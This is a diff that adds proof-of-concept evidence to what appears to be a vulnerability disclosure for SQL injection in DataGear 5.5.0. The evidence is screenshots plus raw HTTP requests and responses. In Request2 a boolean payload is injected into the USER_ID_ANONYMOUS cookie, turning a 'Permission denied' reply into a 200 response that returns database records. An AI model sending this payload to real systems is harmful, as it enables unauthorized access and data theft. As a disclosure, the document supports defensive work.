@@ -37,6 +37,80 @@ By sending the same malicious SQL injection payload to these endpoints, the auth
 The attached screenshot demonstrates the use of a SQL statement to determine whether the number of records in the `DATAGEAR_SCHEMA` table is greater than 1. This confirms the presence of boolean-based blind SQL injection, where the application's response changes based on the truthfulness of the injected SQL condition, even without direct data exfiltration.
 <img width="1393" height="634" alt="9840a904-6d27-4f2a-bf13-a12fc45fe83f" src="https://github.com/user-attachments/assets/250c6bac-5d7b-45bf-8797-3454b2311902" />
 
+**Asset Ownership Verification**
+To confirm the legitimacy of the tested target asset, a screenshot of the target website's homepage is attached as supplementary evidence. This screenshot clearly displays the following key information for asset verification:
+
+The target domain name (consistent with the domain used in vulnerability reproduction), and verification via the browser's developer tools (F12) shows that the icons on the page point to the official website, further validating the asset's attribution
+<img width="1919" height="969" alt="0ad4a2ba-b8cf-405b-9f31-b48a380f77b0" src="https://github.com/user-attachments/assets/23c3dec6-e5fd-44a3-a4cf-07b37f2762bc" />
+<img width="1919" height="966" alt="7c90070b-f076-490f-be51-a2ae258d598d" src="https://github.com/user-attachments/assets/ac42bebf-e260-431b-b51d-7c5757106235" />
+
+The official homepage content of the asset
+<img width="1919" height="1019" alt="56debe7c-e438-4035-b4d1-aeb3ce845774" src="https://github.com/user-attachments/assets/a36cb9f9-c2d4-417a-843a-f7866c556972" />
+
+In addition, redacted (data-desensitized) HTTP request and response packets from the vulnerability exploitation process are attached. Sensitive information (e.g., full IP addresses, personal identifiable information, internal domain names) has been masked to comply with data security regulations while retaining the core proof of vulnerability exploitation.
+<img width="1386" height="633" alt="image" src="https://github.com/user-attachments/assets/9f48e90b-8ca0-432f-9632-fa12a70b8ae2" />
+**Request1**
+POST /data/d5e2bca9b18278ac3514/cms_category/queryData HTTP/1.1
+Host: 3x.xx.xxx.xxx:50401
+Content-Length: 110
+X-Requested-With: XMLHttpRequest
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/json
+Accept-Encoding: gzip, deflate, br
+Cookie: USER_ID_ANONYMOUS=2e69de3d6b994d51bffa0499894ea3ed; DETECTED_VERSION=5.5.0; PAGINATION_PAGE_SIZE=10; ANALYSIS_PROJECT_ID=; THEME=light; MAIN_NAV_ACTIVE_TAB_INDEX=0; DETECT_NEW_VERSION_RESOLVED=true; JSESSIONID=E2DD52AD1A4AAA836E1B37F0CC2D4BD4
+Connection: keep-alive
+
+{"orders":[{"name":"id","type":"asc"}],"keyword":"","notLike":"false","condition":"","page":1,"pageSize":"10"}
+
+**Response1**
+HTTP/1.1 400 
+Set-Cookie: JSESSIONID=CF9D9EF07222B472357CBAACA6D1B510; Path=/; HttpOnly
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Type: application/json;charset=UTF-8
+Content-Language: en-US
+Date: Sat, 17 Jan 2026 12:17:03 GMT
+Connection: close
+Content-Length: 148
+
+{"type":"FAIL","code":"error.PermissionDeniedException","message":"Permission denied","throwableDetail":false,"data":[],"success":false,"fail":true}
+
+<img width="1400" height="671" alt="3be7d753-1f7c-490b-800d-da615c8f8da6" src="https://github.com/user-attachments/assets/961ce9dc-8280-4454-aa06-2d8dc9c4480d" />
+
+**Request2**
+POST /data/d5e2bca9b18278ac3514/cms_category/queryData HTTP/1.1
+Host: 39.xx.xxx.xx:50401
+Content-Length: 110
+X-Requested-With: XMLHttpRequest
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/json
+Accept-Encoding: gzip, deflate, br
+Cookie: USER_ID_ANONYMOUS=2e69de3d6b994d51bffa0499894ea3ed'/**/OR/**/'1'='1; DETECTED_VERSION=5.5.0; PAGINATION_PAGE_SIZE=10; ANALYSIS_PROJECT_ID=; THEME=light; MAIN_NAV_ACTIVE_TAB_INDEX=0; DETECT_NEW_VERSION_RESOLVED=true; JSESSIONID=E2DD52AD1A4AAA836E1B37F0CC2D4BD4
+Connection: keep-alive
+
+{"orders":[{"name":"id","type":"asc"}],"keyword":"","notLike":"false","condition":"","page":1,"pageSize":"10"}
+
+**Response2** Sensitive data has been removed due to its volume.
+
+HTTP/1.1 200 
+Set-Cookie: JSESSIONID=940B7841E132416AA13B4E5A5C309194; Path=/; HttpOnly
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Content-Type: application/json;charset=UTF-8
+Content-Length: 6066
+Date: Sat, 17 Jan 2026 12:20:38 GMT
+Keep-Alive: timeout=60
+Connection: keep-alive
+
+{"total":46,"items":[{"category_flag":"nav","category_list_url":"","category_url":"","top_id":"0","category_type":"3","del":0,"leaf":0,"category_pinyin":"bggk","category_diy_url":"/bggk/benguangaikuang/index.html","category_sort":1,"category_img":"mdiy_model_id":25,"category_keyword":"","id":"1521767434966347778","category_parent_ids":"1521767433544478722","update_by":"57","create_date":"2020-11-19 10:58:41.0"}],"pages":5,"endIndex":10,"page":1,"startRow":1,"startIndex":0,"pageSize":10,"endRow":11}
+
+
 **5. Impact Analysis**
 Privilege Escalation: Successfully bypassed authentication to gain administrator-level access via SQL injection, confirmed through reproduction.
 Data Exfiltration: The vulnerability allows unauthorized reading of sensitive enterprise data from the database, including user credentials, personal information, and internal business records.
